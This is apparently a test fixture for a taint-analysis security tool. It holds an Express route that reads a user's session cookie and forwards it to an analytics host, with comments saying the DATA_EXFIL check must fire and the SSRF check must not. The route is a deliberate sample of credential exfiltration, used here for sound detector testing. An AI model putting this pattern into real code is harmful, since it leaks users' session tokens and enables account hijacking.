var express = require('express');
var { forward } = require('./helper');

var app = express();

// Tainted body, fixed URL: DATA_EXFIL must fire on the body flow.  The
// session cookie is a Sensitive-tier source, so taint carries the
// DATA_EXFIL bit through to the wrapper's body-gate.  SSRF must NOT
// fire — the URL is a hardcoded literal and the cap-vs-position split
// keeps the body's taint from leaking onto the URL's gate.
app.get('/sync', function(req, res) {
    var sid = req.cookies.session;
    var payload = JSON.stringify({ session: sid });
    forward('https://analytics.internal/track', payload);
    res.status(204).end();
});
